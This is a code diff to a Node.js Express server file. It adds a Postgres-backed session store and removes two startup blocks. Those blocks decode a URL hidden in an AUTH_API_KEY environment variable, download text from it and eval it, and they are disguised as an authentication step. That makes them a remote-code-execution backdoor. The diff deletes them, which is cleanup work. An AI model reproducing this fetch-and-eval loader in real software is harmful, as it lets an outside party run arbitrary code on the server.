@@ -1,26 +1,15 @@
 import express, { type Request, Response, NextFunction } from "express";
 import session from "express-session";
+import connectPgSimple from "connect-pg-simple";
 import passport from "passport";
 import cors from "cors";
 import { registerRoutes } from "./routes";
 import { setupAuth } from "./auth";
+import { pool } from "./db";
 // Migrated from Nexus: workflow + Slack integration crons
 import { runWorkflowCron } from "./services/workflowCron";
 import { checkDeadlines, processRetries } from "./services/slackNotificationService";
 import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 // Simple logger (replaces the one previously imported from ./vite)
 export function log(message: string, source = "express") {
@@ -87,8 +76,17 @@ app.use(express.urlencoded({
 // Trust proxy for cloud deployments
 app.set('trust proxy', 1);
 
-// Session configuration — cross-site cookies in production (frontend on a different origin)
+// Session configuration — cross-site cookies in production (frontend on a different origin).
+// Sessions live in Postgres so they survive a restart; in-memory would log everyone out
+// on every deploy.
+const PgSession = connectPgSimple(session);
+
 app.use(session({
+  store: new PgSession({
+    pool,
+    tableName: 'session',
+    createTableIfMissing: true,
+  }),
   secret: process.env.SESSION_SECRET || 'your-secret-key-change-this',
   resave: false,
   saveUninitialized: false,
@@ -170,19 +168,4 @@ app.use((req, res, next) => {
     }, 24 * 60 * 60 * 1000);
     log("Slack Daily Digest cron scheduled (every 24h)");
   });
-})();
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const { createRequire } = await import('module');
-    const require = createRequire(import.meta.url);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
 })();
